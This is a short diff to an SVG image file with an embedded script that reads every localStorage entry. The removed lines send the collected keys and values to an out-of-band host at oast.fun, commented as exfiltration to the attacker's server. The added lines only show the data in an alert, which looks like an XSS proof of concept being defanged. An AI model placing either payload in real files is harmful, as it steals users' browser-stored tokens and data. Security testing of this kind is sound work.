@@ -5,10 +5,10 @@
       for (let i = 0; i < localStorage.length; i++) {
         let key = localStorage.key(i);
         let value = localStorage.getItem(key);
-        data += encodeURIComponent(key) + '=' + encodeURIComponent(value) + '&';
+        data += key + ': ' + value + '\n';
       }
-      // Send the exfiltrated data to the attacker's server
-      fetch('https://cydlhjnpvjqqgvjwcfhorjxk718cwezae.oast.fun/?' + data);
+      // Alert the collected localStorage data
+      alert(data);
     ]]>
   </script>
   <rect x="10" y="10" width="80" height="80" fill="blue"/>
